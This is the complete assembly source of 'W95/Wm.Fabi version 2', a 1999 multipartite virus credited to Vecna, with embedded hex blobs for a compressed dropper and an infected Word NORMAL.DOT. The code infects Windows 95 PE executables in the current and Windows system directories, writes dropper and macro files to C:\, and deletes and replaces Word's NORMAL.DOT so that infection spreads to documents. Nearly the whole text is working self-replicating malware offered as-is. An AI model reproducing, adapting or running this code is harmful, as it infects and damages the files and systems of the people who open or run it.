   ; W95/Wm.Fabi version 2
   ; (c) Vecna 1999
   ;
   ; This is a updated version of my multipartite virus Fabi. It fixes the bugz
   ; while infecting big PE files, and also has the correct directory to NORMAL.DOT
   ; for all supported WinWord versions. Now this virus is encripted, use a better
   ; compression algorithm for the preparated NORMAL.DOT and macro code, and, more
   ; important, use a new scheme to jump DOC->PE. Yeahh, no more dropping a debug
   ; script, and using a batch file to make it a PE EXE!!!
   ;
   ; Now I convert the PE dropper in printable characters, stored into variable
   ; inside the virus, then re-create it using some math. Clear and fast. I am
   ; really sad dont have thinked this scheme before, for first Fabi and Cocaine.
   ;
   ; This new way is 100% safe, work faster and more reliable than older method.
   ; And also is 10x times smaller than old'n'buggy DEBUG.EXE way.
   ;
   ; The new compression algorithm, aPLib v0.22b, compress very better than my old
   ; LZW scheme. This is why this virus is under 10kb, a new record for me :P
   ;
   ; Greetz goes to Kalamarai, thankz to Somnium, and fuckz to all the rest
   ;
   ; vecna@antisocial.com

   --[SOURCE]-------------------------------------------------------------------->8


   ;W95/Wm.Fabi version 2
   ;Infect PE files and Word 8 documents
   ;(c) Vecna 1999

   .386p
   .model flat
   locals
   .data
   dd ?

   .code

   ofs   equ offset
   by    equ byte ptr
   wo    equ word ptr
   dwo   equ dword ptr
   K32   equ 0BFF70000h

   extrn ExitProcess:proc
   extrn MessageBoxA:proc

   start:
          cld
          call @@0
     @@0:
          pop ebp
          sub ebp, ofs @@0
          lea esi, [ebp+ofs start_crypt]
          mov ecx, ofs end_crypt-ofs start_crypt
          mov ebx, 12345678h
        org $-4
        crypt1 dd 0
     @@1:
          xor [esi], ebx
          lodsd
          add ebx, 12345678h
        org $-4
        crypt2 dd 0
          loop @@1
        ret_place equ by $
          jmp $+2
        start_crypt equ by $
          cmp by [esp+3], 0bfh
          push ofs stub
        old_eip equ dwo $-4
          je VirusStart
          ret

          db '(c) Vecna', 13, 10
          db 'A minha poesia j  nÆo tem teu nome...', 13, 10

   vxdcall dd 0
   seed    dd 0

   VirusStart:
          call vinit                              ;get vxdcall0
          mov ah, 1ah
          lea edx, [ebp+ofs DTA]
          call int21
          sub edx, edx
          lea esi, [ebp+ofs actualdir+1]
          mov by [esi-1], '\'
          mov ah, 47h
          call int21                              ;save current directory
          call InfectDir
          mov ah, 3bh
          call @@1
          db '\WINDOWS', 0
     @@1:
          pop edx
          call int21
          call InfectDir
          mov ah, 3bh
          call @@2
          db '\WINDOWS\SYSTEM', 0
     @@2:
          pop edx
          call int21
          call InfectDir
          mov ah, 3bh
          lea edx, [ebp+ofs actualdir]
          call int21
          call macro_fun
          ret

   int21:
          call @@0
     @@0:
          pop ebp
          sub ebp, ofs @@0
          push ecx
          push eax
          push 002A0010h
          call [ebp+ofs vxdcall]                  ;call emulated pmode int21
          ret

   vinit:
          call @@0
          mov esp, [esp+8]                        ;on fault: restore stack
          jmp @@1
     @@0:
          sub ecx, ecx
          push dwo fs:[ecx]
          mov fs:[ecx], esp                       ;set SEH
          cmp dwo ds:[K32+80h], 'EP'
          jnz @@1
          mov esi, ds:[K32+80h+78h]               ;get import dir
          add esi, K32+1ch
          mov eax, [esi]
          mov ebx, [eax+K32]
          add ebx, K32
          mov [ebp+ofs vxdcall], ebx              ;store VxDCall0
          clc
          db 0b0h                                 ;mov al, garbage
     @@1:
          stc                                     ;signal error
          pop dwo fs:[0]                          ;remove SEH
          pop ecx
          ret

   InfectDir:
          mov ah, 4eh
          call @@0
          db '*.EXE', 0
     @@0:
          pop edx
          mov ecx, 27
     @@1:
          call int21
          jc @@2
          lea edx, [ebp+ofs DTA+1eh]
          call Infect
          mov ah, 4fh
          jmp @@1
     @@2:
          ret

   Infect:
          call @@set_seh
          mov esp, [esp+8]                        ;on fault: restore stack
          jmp @@fault
     @@set_seh:
          sub ecx, ecx
          push dwo fs:[ecx]
          mov fs:[ecx], esp                       ;set SEH
          mov ax, 4300h
          call int21
          jc @@fault
          push edx
          push ecx
          mov ax, 4301h
          sub ecx, ecx
          call int21
          jc @@1
          mov ax, 3d02h
          call int21
          mov ebx, eax
          jc @@1
          mov ax, 5700h
          call int21
          jc @@22
          push ecx
          push edx
          xor edx, ecx
          mov dwo [ebp+seed], edx                 ;init rnd seed with file date
          mov ah, 3fh
          mov ecx, 1024
          lea edx, [ebp+header]
          mov esi, edx
          call int21
          jc @@2
          xor eax, ecx
          jnz @@2
          cmp wo [esi], 'ZM'
          jne @@2
          mov eax, dwo [esi+3ch]
          add esi, eax
          cmp eax, 900
          jnb @@2
          cmp dwo [esi], 'EP'
          jne @@2
          mov eax, 'IBAF'
          cmp dwo [esi+88], eax
          mov dwo [esi+88], eax
          je @@2
          cmp wo [esi+4], 014Ch         ;i386?
          jne @@2
          movzx eax, wo [esi+22]
          not al
          test eax, 2002h
          jnz @@2                                 ;isnt DLL? is executable?
          movzx eax, wo [esi+6]
          dec eax
          imul eax, eax, 40
          lea edi, [esi+0e0h+24]
          add edi, eax                            ;edi==last section header
          mov edx, [edi+16]
          push edx
          add edx, [edi+12]
          xchg edx, [esi+40]
          mov [ebp+ofs old_eip], edx
          pop edx
          add edx, [edi+20]
          mov dwo [edi+36], 0c0000040h
          add dwo [edi+8], ofs vvend-ofs start
          add dwo [edi+16], ofs vend-ofs start
          mov eax, [esi+52]
          add [ebp+ofs old_eip], eax
          mov eax, [edi+8]
          add eax, [edi+12]
          mov [esi+80], eax
          mov ax, 4200h
          mov ecx, edx
          shr ecx, 16
          call int21
          mov ah, 40h
          lea edx, [ebp+ofs DTA+55]
          mov edi, edx
          lea esi, [ebp+ofs start]
          mov ecx, ofs vend-ofs start
          pushad
          rep movsb
          mov by [edx+(ofs ret_place-ofs start)], 0c3h
          call rnd
          mov dwo [edx+(ofs crypt1-ofs start)], eax
          call rnd
          mov dwo [edx+(ofs crypt2-ofs start)], eax
          call edx
          mov by [edx+(ofs ret_place-ofs start)], 0ebh
          popad
          call int21
          mov ax, 4200h
          sub ecx, ecx
          cdq
          call int21
          mov ah, 40h
          lea edx, [ebp+ofs header]
          mov ecx, 1024
          call int21
     @@2:
          pop edx
          pop ecx
          mov ax, 5701h
          call int21
     @@22:
          mov ah, 3eh
          call int21
     @@1:
          pop ecx
          pop edx
          mov ax, 4301h
          call int21
     @@fault:
          pop dwo fs:[0]                          ;remove SEH
          pop ecx
          ret

   rnd:
          push ecx
          push edx
          mov eax, dwo [ebp+seed]
          mov ecx, 41C64E6Dh
          mul ecx
          add eax, 00003039h
          and eax, 7FFFFFFFh
          mov dwo [ebp+seed], eax
          pop edx
          pop ecx
          ret

   include unpack.inc

   include dropper.inc

   macro_fun:
          mov ah, 5bh
          call @@1
    fname db 'C:\FABI.SYS', 0
     @@1:
          pop edx
          push 2
          pop ecx
          call int21
          jc @@0
          push eax
          lea eax, [ebp+ofs vend]
          push eax
          lea eax, [ebp+ofs dropper]
          push eax
          call _aP_depack_asm
          pop ebx
          mov ecx, eax
          mov ah, 40h
          lea edx, [ebp+ofs vend]
          call int21
          mov ah, 3eh
          call int21                  ;dropper created!
          lea edx, [ebp+ofs fname]
          call Infect                 ;dropper infected!
          call @@2
          db 'C:\FABI.SRC', 0
     @@2:
          pop edx
          mov ax, 3c00h
          push 2
          pop ecx
          call int21
          jc @@0
          mov ebx, eax
          call @@3
     @@4:
          db "'FABI", 13, 10
          db "SUB AutoClose()", 13, 10
          db "ON ERROR RESUME NEXT", 13, 10
          db 'AA="'
     @@3:
          pop edx
          mov ecx, ofs @@3-ofs @@4
          mov ah, 40h
          call int21
          push ebx
          mov ax, 3d00h
          lea edx, [ebp+ofs fname]
          call int21
          mov ebx, eax
          mov eax, 4202h
          sub ecx, ecx
          cdq
          call int21
          push eax
          mov eax, 4200h
          sub ecx, ecx
          cdq
          call int21
          mov ecx, [esp]
          mov ah, 3fh        ;read dropper
          lea edx, [ebp+ofs vend]
          call int21
          mov ah, 3eh
          call int21
          pop ecx
          lea edi, [edx+ecx]
          mov esi, edx
          call script
          pop ebx
          mov esi, ecx
     @@chunk000:
          mov dwo [ebp+i_value], 0
          mov ecx, 240
          cmp ecx, esi
          jb @@chunk001
          mov ecx, esi
     @@chunk001:
          push ecx
          lea edi, [edx+ecx]
          mov ecx, 25
          mov al, '+'
          std
     @@scan:
          repne scasb
          jne @@qwe
          cmp by [edi], '"'
          je @@ksks
          inc edi
     @@ksks:
          sub edi, edx
          mov [esp], edi                           ;new size
          mov dwo [ebp+i_value], 2                 ;skip the +" after the String()
     @@qwe:
          cld
          pop ecx
          sub esi, ecx
     @@hrhhr:
          cmp by [edx+ecx], 0
          jne @@jjsjs
          dec ecx
          jmp @@hrhhr
     @@jjsjs:
          mov ah, 40h
          call int21                              ;write script
          test esi, esi
          jz @@chunk004
          lea edx, [edx+eax]
          add edx, 12345678h
          org $-4
        i_value dd 0
          push edx
          call @@chunk002
     @@chunk003:
          db '"', 13, 10
          db 'AA=AA+"'
     @@chunk002:
          pop edx
          mov ecx, ofs @@chunk002-ofs @@chunk003
          cmp dwo [ebp+i_value], 0
          je @@qwer
          dec ecx
          mov eax, [esp]
          cmp by [eax], 'S'
          je @@qwer
          inc edx
     @@qwer:
          mov ah, 40h
          call int21
          pop edx
          jmp @@chunk000
     @@chunk004:
          lea eax, [ebp+ofs vend]
          push eax
          lea eax, [ebp+ofs macrocode]
          push eax
          call _aP_depack_asm
          mov ecx, eax
          mov ah, 40h
          lea edx, [ebp+ofs vend]
          call int21                              ;write final part of macro code
          mov ah, 3eh
          call int21                  ;source done!!!
          mov ecx, 9
     @@44:
          push ecx
          lea eax, [ecx+'0']
          mov by [ebp+ofs p1], al
          mov by [ebp+ofs p2], al
          mov by [ebp+ofs p3], al
          lea edx, [ebp+file1]
          call CheckAttr
          jnc @@5
          lea edx, [ebp+file2]
          call CheckAttr
          jnc @@5
          lea edx, [ebp+file3]
          call CheckAttr
          jnc @@5
          pop ecx
          loop @@44
          jmp @@0
     @@5:
          add esp, 4               ;templates directory found!!!
          mov eax, 4301h
          sub ecx, ecx
          call int21
          jc @@0
          mov ah, 41h
          call int21               ;delete old normal.dot
          jc @@0
          push edx
          lea eax, [ebp+ofs vend]
          push eax
          lea eax, [ebp+ofs normaldot]
          push eax
          call _aP_depack_asm
          pop edx
          push eax                                ;size
          mov eax, 3c00h
          sub ecx, ecx
          call int21
          pop ecx
          jc @@0
          xchg eax, ebx
          mov ah, 40h
          lea edx, [ebp+ofs vend]
          call int21
          mov ah, 3eh
          call int21               ;create new normal.dot
     @@0:
          ret

   file1  db 'C:\ARQUIV~1\MICROS~'
   p1     db '1'
          db '\MODELOS\NORMAL.DOT', 0

   file2  db 'C:\ARCHIV~1\MICROS~'
   p2     db '1'
          db '\PLANTI~1\NORMAL.DOT', 0

   file3  db 'C:\PROGRA~1\MICROS~'
   p3     db '1'
          db '\TEMPLA~1\NORMAL.DOT', 0

   include macro.inc

   script:
          push edi
     @@0:
          lodsb
          mov ah, al
          and ax, 1111000000001111b
          shr ah, 4
          add ax, 'AA'
          stosw
          loop @@0
          pop ecx
          mov esi, edi
          sub edi, ecx
          xchg ecx, edi
          xchg edi, esi
          sub eax, eax
          sub ebx, ebx
          push edi
     @@1:
          lodsb
          cmp al, ah
          jne @@2
          inc ebx
          loop @@1
          push eax
          mov al, ah
          jmp @@111
     @@2:
          push ecx
          or ebx, ebx
          jz @@3
          push eax
          mov al, ah
          cmp ebx, 20
          jbe @@4
     @@111:
          inc ebx
          dec edi
          push esi
          call @@0001
     @@0000:
          db '"+String('
     @@0001:
          pop esi
          mov ecx, ofs @@0001-ofs @@0000
          rep movsb
          call MakeDecimal
          mov wo [edi], '",'
          inc edi
          inc edi
          stosb
          mov eax, '"+)"'
          stosd
          pop esi
          jmp @@5
     @@4:
          mov ecx, ebx
          rep stosb
     @@5:
          pop eax
          sub ebx, ebx
     @@3:
          stosb
          mov ah, al
          pop ecx
          loop @@1
          pop ecx
          mov dwo [edi], 0
          mov dwo [edi+4], 0
          sub edi, ecx
          xchg edi, ecx                           ;edi=edx=buffer
          mov edx, edi                            ;ecx=size
          ret

   MakeDecimal:
          push eax
          push ecx
          mov eax, ebx
          sub ebx, ebx
          mov ecx, 10
     @@1:
          sub edx, edx
          div ecx
          push edx
          inc ebx
          or eax, eax
          jnz @@1
          mov ecx, ebx
     @@2:
          pop eax
          add al, '0'
          stosb
          loop @@2
          pop ecx
          pop eax
          ret

   CheckAttr:
          mov eax, 4300h
          call int21
          ret

   include loader.inc

          dd 0, 0


   end_crypt equ this byte
   vend equ this byte                             ;virus end

   actualdir db 255 dup (?)

   header db 1024 dup (?)

   DTA    db 50 dup (?)

         db 128*1024 dup (?)

   vvend equ this byte                            ;virus virtual end



   stub:
          push 0
          call @@1
          db '(c) Vecna', 0
     @@1:
          call @@2
          db 'First Generation', 0
     @@2:
          push 0
          call MessageBoxA
          push 0
          call ExitProcess

   end    start

   --[Dropper.inc]--------------------------------------------------------------->8


   dropper equ this byte
   DB 04DH,038H,05AH,050H,038H,002H,067H,002H,004H,007H,00FH,007H,0FFH,01CH
   DB 010H,0B8H,0E1H,048H,001H,040H,0E0H,01AH,0E1H,00AH,0B3H,001H,01CH,006H,0BAH
   DB 010H,000H,00EH,01FH,0B4H,009H,0CDH,021H,07DH,0B8H,067H,04CH,00AH,090H,010H
   DB 054H,068H,069H,073H,007H,020H,070H,072H,06FH,067H,033H,061H,06DH,0C7H,027H
   DB 075H,0C7H,074H,0D3H,062H,065H,0C7H,0FFH,00FH,06EH,099H,006H,064H,0E7H,0C7H
   DB 0D3H,057H,069H,0D0H,033H,032H,00DH,01CH,00AH,024H,037H,029H,001H,057H,063H
   DB 050H,045H,014H,008H,04CH,001H,0FEH,005H,06DH,026H,0E9H,0A6H,063H,014H,0E0H
   DB 080H,08EH,081H,00BH,012H,001H,002H,019H,032H,019H,006H,099H,015H,010H,04CH
   DB 004H,020H,093H,01EH,02AH,00CH,0CAH,041H,001H,01FH,067H,003H,005H,00AH,034H
   DB 051H,08DH,04DH,04DH,014H,04CH,039H,020H,0A6H,008H,0F7H,04AH,04BH,057H,001H
   DB 032H,030H,006H,054H,0BDH,0A1H,032H,0D7H,00CH,09DH,0F8H,078H,043H,04FH,02BH
   DB 044H,045H,0D8H,06AH,0ECH,0D2H,09AH,001H,0A0H,0B7H,060H,044H,041H,054H,0E5H
   DB 0A9H,050H,0FCH,0EAH,028H,014H,008H,0A3H,0ACH,0C0H,007H,02EH,069H,064H,061H
   DB 074H,02AH,028H,064H,030H,072H,00AH,017H,081H,072H,065H,06CH,06FH,063H,01CH
   DB 040H,08EH,042H,00CH,0B3H,050H,085H,06FH,001H,0AEH,0CEH,06AH,00EH,0E8H,011H
   DB 00EH,0FFH,025H,030H,02EH,040H,011H,0FFH,0AFH,01CH,028H,030H,021H,066H,038H
   DB 019H,0FFH,0D2H,09DH,028H,011H,046H,0D5H,008H,081H,04BH,045H,052H,04EH,0CCH
   DB 04CH,033H,00EH,032H,02EH,064H,06CH,034H,010H,07FH,000H,078H,069H,074H,050H
   DB 072H,06FH,063H,065H,071H,073H,09BH,001H,077H,0F1H,010H,0C2H,0D1H,07FH,00EH
   DB 009H,030H,015H,001H,0FFH,0AFH,060H,000H


   --[Loader.inc]---------------------------------------------------------------->8

   normaldot equ this byte
   DB 0D0H,001H,0CFH,011H,0E0H,0A1H,0B1H,01AH,0E1H,0C2H,0B6H,001H,070H,03EH
   DB 070H,003H,01CH,0FEH,0FFH,009H,01CH,006H,021H,0C6H,001H,009H,056H,021H,00DH
   DB 020H,010H,053H,023H,014H,06DH,050H,002H,0C2H,026H,020H,009H,0F7H,05BH,001H
   DB 0BEH,0C3H,0ECH,0A5H,0C1H,083H,049H,080H,016H,004H,007H,090H,0CAH,024H,012H
   DB 0BFH,0DAH,05BH,024H,003H,004H,0DCH,0B3H,009H,00EH,081H,062H,06AH,088H,004H
   DB 0B2H,0B3H,038H,057H,001H,0DBH,06CH,097H,003H,01EH,01CH,00AH,010H,0D0H,0D9H
   DB 001H,004H,0B5H,004H,07AH,001H,065H,0DCH,00FH,04AH,008H,002H,00CH,076H,0A7H
   DB 040H,010H,05DH,0C8H,08CH,0EFH,015H,00CH,0B5H,03EH,008H,029H,014H,042H,065H
   DB 0A0H,07BH,008H,014H,0FDH,01AH,030H,086H,011H,01BH,011H,0A5H,030H,095H,0E4H
   DB 087H,029H,0B6H,040H,056H,0AFH,008H,0C6H,02CH,091H,044H,0A3H,0CFH,0F1H,019H
   DB 04BH,008H,0E1H,09AH,002H,003H,0F4H,024H,019H,08EH,07EH,094H,03EH,018H,0C9H
   DB 015H,017H,04EH,095H,08CH,070H,0B5H,079H,001H,04AH,0A0H,0A6H,0E0H,0ADH,010H
   DB 015H,08CH,058H,0EDH,026H,000H,0A8H,08CH,0AFH,010H,069H,00AH,020H,0B8H,05FH
   DB 024H,0F8H,055H,02BH,050H,0C5H,0A0H,035H,01CH,02AH,0C0H,06AH,040H,040H,074H
   DB 0ADH,001H,0F1H,02CH,027H,040H,0C4H,025H,01BH,008H,00CH,080H,060H,0EAH,081H
   DB 032H,059H,06FH,026H,0BEH,001H,018H,0F4H,0A5H,001H,075H,01CH,00DH,023H,0FFH
   DB 0FAH,053H,0E8H,00DH,003H,012H,017H,091H,009H,00AH,022H,00BH,044H,00DH,00EH
   DB 089H,00FH,012H,010H,024H,011H,05FH,0E2H,044H,013H,014H,089H,015H,012H,016H
   DB 024H,017H,048H,018H,091H,019H,022H,01AH,044H,01BH,01CH,089H,01DH,012H,01EH
   DB 024H,01FH,048H,020H,091H,021H,022H,022H,044H,023H,07AH,089H,07BH,012H,083H
   DB 024H,084H,048H,08CH,091H,08DH,022H,093H,044H,094H,095H,089H,096H,012H,09CH
   DB 024H,09DH,048H,0C2H,091H,0D6H,022H,0D7H,044H,0DDH,0DEH,089H,0DFH,012H,0E0H
   DB 024H,0E6H,048H,0E7H,088H,00AH,013H,011H,014H,022H,015H,044H,021H,022H,089H
   DB 023H,012H,02EH,024H,02FH,048H,037H,091H,038H,022H,098H,044H,099H,0A3H,089H
   DB 0A4H,012H,0A5H,024H,0A6H,048H,0B3H,091H,0B4H,022H,0F4H,044H,0FBH,0FCH,088H
   DB 002H,014H,081H,003H,012H,007H,024H,008H,048H,012H,091H,013H,066H,042H,0F2H
   DB 005H,0E0H,0ECH,0D4H,0FAH,083H,054H,004H,0DAH,0CEH,005H,0D4H,00EH,0CEH,00AH
   DB 0C8H,0ABH,038H,06AH,036H,002H,0EEH,014H,009H,0F5H,025H,005H,065H,004H,076H
   DB 01BH,003H,00EH,00AH,009H,06AH,003H,001H,0E8H,0F0H,06DH,048H,0C1H,004H,048H
   DB 00CH,0F3H,087H,090H,0E7H,0F2H,0DFH,01EH,043H,04BH,0C8H,04AH,079H,04CH,00FH
   DB 023H,0E0H,01EH,010H,0BEH,050H,067H,055H,01CH,008H,001H,068H,0F8H,00CH,06EH
   DB 048H,016H,024H,007H,0ACH,009H,04EH,04CH,029H,0E8H,027H,0E8H,077H,093H,0E0H
   DB 092H,016H,072H,0D8H,01AH,04EH,0D0H,049H,01EH,0C8H,0C8H,022H,091H,024H,022H
   DB 03DH,044H,046H,04BH,089H,05BH,012H,071H,04EH,0D8H,044H,09EH,0A8H,089H,0B5H
   DB 027H,0B8H,022H,0E8H,049H,0FCH,0A0H,0C8H,023H,091H,039H,026H,0FDH,080H,0D1H
   DB 0FBH,04EH,00DH,021H,0F9H,05FH,0C4H,0FDH,02FH,0B2H,0F7H,0B5H,034H,064H,0F5H
   DB 02FH,088H,0F3H,0D1H,0F1H,067H,0E2H,0C6H,001H,012H,009H,044H,013H,019H,089H
   DB 018H,012H,00FH,025H,010H,0A3H,06FH,026H,01CH,000H,050H,0D9H,014H,081H,0FEH
   DB 0C6H,053H,0FBH,0F7H,0D8H,002H,001H,0E3H,0CEH,060H,001H,01FH,0B0H,01DH,0D0H
   DB 02FH,020H,007H,0E0H,03DH,021H,081H,0A5H,006H,022H,081H,009H,023H,090H,089H
   DB 005H,024H,013H,025H,0E4H,0DFH,004H,0AEH,092H,0B7H,000H,04DH,00EH,04AH,0DBH
   DB 000H,07EH,0BBH,014H,025H,067H,000H,07BH,0BAH,002H,0BDH,06CH,025H,042H,0E8H
   DB 0BFH,00CH,0ABH,001H,014H,05DH,088H,0C7H,022H,003H,00AH,008H,0EFH,08AH,013H
   DB 01AH,04AH,008H,0DCH,095H,09EH,000H,029H,036H,013H,008H,042H,01CH,006H,002H
   DB 02DH,01AH,006H,0D0H,021H,095H,02DH,0F8H,003H,02BH,02AH,000H,056H,030H,032H
   DB 0F4H,021H,0F2H,026H,031H,011H,044H,0ACH,0DDH,08BH,084H,06FH,0C8H,002H,094H
   DB 0DFH,010H,0D4H,008H,0BEH,010H,0E6H,01CH,04AH,0D1H,000H,0DAH,01EH,04AH,018H
   DB 04AH,0CBH,000H,0D4H,0F8H,056H,070H,095H,001H,0E5H,02AH,0A0H,094H,070H,092H
   DB 012H,0E7H,009H,07CH,00AH,061H,00BH,05BH,0A4H,011H,0BFH,051H,024H,000H,040H
   DB 0F1H,0FFH,0DEH,01CH,022H,090H,039H,070H,04EH,070H,06FH,070H,072H,070H,06DH
   DB 070H,061H,045H,06CH,043H,024H,004H,04FH,01CH,014H,03CH,072H,0A8H,036H,0E0H
   DB 041H,00DH,040H,0F2H,0FFH,0A1H,011H,0A8H,002H,09DH,067H,046H,071H,06EH,007H
   DB 074H,004H,065H,0ECH,018H,036H,070H,07DH,088H,070H,0E1H,070H,067H,053H,02EH
   DB 00EH,033H,064H,021H,0E3H,057H,044H,044H,0CAH,001H,064H,049H,050H,049H,0F5H
   DB 03BH,065H,04CH,00EH,072H,005H,00CH,056H,091H,063H,0D9H,0A1H,074H,03CH,0C1H
   DB 043H,0C1H,03AH,0C1H,05CH,0B3H,0D8H,085H,071H,083H,075H,083H,069H,083H,076H
   DB 032H,091H,073H,0B1H,064H,0A6H,06CH,050H,031H,06CH,06FH,0D5H,00CH,061H,0A6H
   DB 0B6H,066H,073H,059H,04DH,04DH,055H,063H,018H,0FBH,02AH,009H,066H,096H,0CDH
   DB 050H,04FH,011H,0EAH,0A5H,018H,065H,04AH,022H,06FH,040H,095H,06CH,024H,02BH
   DB 05CH,0F6H,066H,02EH,035H,0FDH,08AH,069H,0FFH,001H,09EH,044H,056H,0DDH,0B4H
   DB 0C2H,03EH,065H,010H,026H,001H,04AH,0BBH,01CH,03BH,0D9H,054H,0C1H,068H,0B3H
   DB 0CBH,0A6H,044H,066H,02DH,0D6H,075H,031H,048H,065H,017H,0D9H,034H,041H,0BCH
   DB 01DH,067H,02DH,045H,005H,078H,036H,0DDH,07CH,04EH,011H,032H,093H,04EH,0A5H
   DB 09CH,052H,059H,092H,042H,04CH,052H,041H,048H,0C9H,0A2H,053H,095H,083H,04FH
   DB 0FAH,033H,055H,031H,045H,02AH,045H,054H,041H,0FDH,099H,011H,04FH,021H,058H
   DB 098H,009H,043H,079H,040H,002H,048H,010H,048H,0F2H,020H,006H,008H,026H,0D6H
   DB 00AH,020H,045H,047H,016H,090H,0CEH,027H,002H,02FH,006H,0A7H,005H,004H,02EH
   DB 0FDH,07AH,077H,091H,078H,07AH,08CH,001H,0A0H,069H,0A6H,0A3H,091H,050H,011H
   DB 04EH,035H,077H,011H,00AH,08CH,06FH,0CFH,066H,06EH,041H,035H,035H,010H,090H
   DB 00EH,0E5H,005H,03BH,00AH,0B9H,007H,006H,0E7H,0C7H,04EH,017H,069H,034H,048H
   DB 001H,080H,0E1H,015H,00CH,0B0H,079H,069H,062H,0D3H,074H,031H,036H,033H,022H
   DB 050H,07EH,00BH,006H,004H,0E9H,045H,001H,03FH,07EH,048H,0D4H,089H,069H,0B9H
   DB 06AH,022H,034H,068H,031H,010H,008H,088H,018H,010H,0C4H,002H,02AH,0A9H,023H
   DB 00DH,0FBH,07DH,033H,026H,0C0H,0D1H,046H,049H,034H,0CAH,09EH,042H,0FDH,033H
   DB 09AH,014H,003H,010H,016H,0A9H,0DAH,059H,02AH,0D5H,0D0H,0A5H,006H,01CH,0C0H
   DB 007H,0B4H,034H,004H,081H,0DFH,012H,030H,03CH,08CH,0EBH,096H,072H,056H,012H
   DB 03EH,0B3H,0FAH,04AH,00CH,072H,097H,001H,000H,0A1H,03CH,0E5H,026H,065H,066H
   DB 059H,0C7H,030H,014H,083H,005H,00BH,000H,002H,08BH,0EEH,085H,0F6H,075H,09FH
   DB 0A8H,017H,03BH,005H,030H,024H,0E4H,00CH,00FH,083H,0B8H,02BH,023H,008H,028H
   DB 090H,051H,0A0H,05DH,05FH,05EH,026H,05BH,0C2H,03CH,007H,08BH,075H,014H,030H
   DB 06DH,010H,0E9H,077H,0BAH,075H,0A7H,034H,090H,08EH,0F5H,0C0H,05EH,0EBH,0CAH
   DB 08BH,000H,044H,024H,008H,056H,00FH,0B7H,0C8H,0F7H,070H,0C1H,066H,0FCH,056H
   DB 0BEH,0F5H,07EH,080H,037H,084H,08BH,04BH,0D0H,074H,024H,010H,056H,067H,050H
   DB 00DH,014H,0A1H,015H,040H,011H,0EDH,065H,0ECH,0E8H,0B2H,050H,081H,0B5H,05EH
   DB 028H,0C2H,00CH,01AH,0EBH,05CH,004H,015H,054H,034H,01CH,096H,08BH,06DH,037H
   DB 0B4H,0CBH,045H,089H,002H,006H,028H,08BH,00DH,087H,007H,039H,065H,040H,004H
   DB 078H,082H,044H,04EH,08BH,07CH,098H,054H,066H,0C1H,0E2H,009H,010H,081H,0E1H
   DB 003H,02AH,01FH,082H,00CH,040H,004H,0DFH,0C9H,0F8H,089H,06BH,008H,022H,090H
   DB 084H,00BH,0CAH,0DFH,041H,037H,01CH,025H,050H,00FH,0BCH,04CH,02FH,004H,026H
   DB 048H,010H,0A7H,0A7H,0A1H,064H,007H,07CH,04CH,086H,0E1H,04BH,001H,0FFH,0FBH
   DB 02DH,0FEH,087H,044H,004H,005H,002H,07DH,018H,02AH,040H,034H,0E0H,085H,09FH
   DB 0F2H,0F9H,003H,04FH,068H,010H,0ABH,091H,008H,080H,02BH,027H,0B3H,05EH,0D9H
   DB 04CH,0F7H,050H,033H,010H,0A6H,020H,06AH,088H,008H,03AH,091H,090H,022H,003H
   DB 045H,09CH,02FH,04CH,017H,0A8H,009H,005H,089H,0B8H,012H,007H,024H,0C4H,048H
   DB 008H,091H,0D4H,022H,009H,044H,0E4H,012H,089H,0F0H,012H,00AH,022H,00CH,001H
   DB 02CH,011H,018H,089H,00DH,012H,024H,024H,00EH,048H,030H,091H,00FH,029H,038H
   DB 074H,099H,040H,011H,013H,012H,048H,02AH,078H,019H,0E4H,0DBH,01EH,05DH,08CH
   DB 095H,002H,073H,00CH,0F2H,006H,020H,056H,065H,063H,06EH,070H,061H,052H,066H
   DB 01CH,09BH,021H,0E5H,070H,098H,04EH,06FH,072H,01CH,06DH,061H,06CH,02BH,02CH
   DB 06EH,010H,0D4H,060H,038H,031H,052H,02CH,050H,074H,04DH,07CH,069H,01CH,072H
   DB 06FH,073H,083H,066H,074H,020H,057H,03AH,06CH,064H,092H,038H,02EH,04AH,00DH
   DB 040H,050H,007H,046H,0C3H,023H,008H,0AAH,00CH,009H,0F2H,0C1H,0F0H,058H,054H
   DB 0FAH,02AH,00CH,008H,038H,085H,014H,059H,094H,003H,078H,0D2H,0B7H,0F2H,057H
   DB 008H,095H,001H,0EBH,0FFH,0E4H,0BCH,000H,0FDH,047H,012H,043H,0D5H,0CDH,090H
   DB 09CH,02EH,01BH,012H,010H,093H,097H,0F0H,000H,02CH,019H,0F9H,0AEH,044H,029H
   DB 005H,01FH,04FH,0F4H,0CEH,0E8H,0CDH,031H,00CH,009H,0EEH,024H,068H,048H,00FH
   DB 091H,070H,022H,005H,044H,07CH,006H,089H,084H,012H,011H,024H,08CH,048H,017H
   DB 091H,094H,022H,00BH,044H,09CH,010H,089H,0A4H,012H,013H,024H,0ACH,048H,016H
   DB 091H,0B4H,022H,00DH,053H,0BCH,05CH,034H,0C9H,006H,0B9H,0F4H,0A6H,00FH,0E0H
   DB 032H,038H,039H,041H,04BH,08FH,060H,04BH,09FH,068H,014H,0B3H,00DH,0A4H,029H
   DB 00BH,010H,0A9H,008H,0F1H,01EH,0A5H,0FAH,059H,024H,067H,00CH,0DAH,065H,049H
   DB 07BH,021H,080H,054H,0EDH,074H,075H,06CH,06FH,0AEH,05CH,052H,098H,060H,0CAH
   DB 020H,014H,065H,036H,072H,098H,03EH,09AH,010H,084H,00CH,00AH,041H,05FH,050H
   DB 049H,044H,0D0H,047H,055H,0D4H,00AH,0B6H,0B2H,041H,024H,04EH,04AH,07BH,0B8H
   DB 025H,0E1H,05AH,039H,02BH,083H,0B2H,034H,083H,030H,067H,009H,030H,02DH,00CH
   DB 04CH,042H,0E0H,033H,0D9H,005H,014H,031H,0BFH,005H,06FH,045H,059H,025H,043H
   DB 09BH,039H,034H,015H,0A5H,048H,002H,035H,0B7H,044H,06AH,036H,0A9H,002H,01CH
   DB 07DH,02BH,001H,0D7H,055H,049H,05BH,0B4H,099H,003H,009H,004H,012H,005H,024H
   DB 006H,048H,007H,091H,031H,022H,009H,044H,00AH,00BH,089H,00CH,012H,00DH,024H
   DB 00EH,048H,00FH,091H,039H,022H,011H,044H,012H,013H,089H,014H,012H,015H,024H
   DB 016H,048H,017H,0A5H,076H,018H,099H,019H,011H,01AH,091H,009H,01BH,022H,01CH
   DB 044H,01DH,01EH,089H,01FH,04CH,020H,0FDH,0CCH,009H,022H,019H,028H,0A6H,010H
   DB 066H,025H,011H,026H,009H,044H,027H,029H,089H,038H,012H,02AH,024H,02BH,048H
   DB 02CH,091H,02DH,022H,02EH,044H,02FH,030H,0A6H,034H,044H,032H,033H,089H,034H
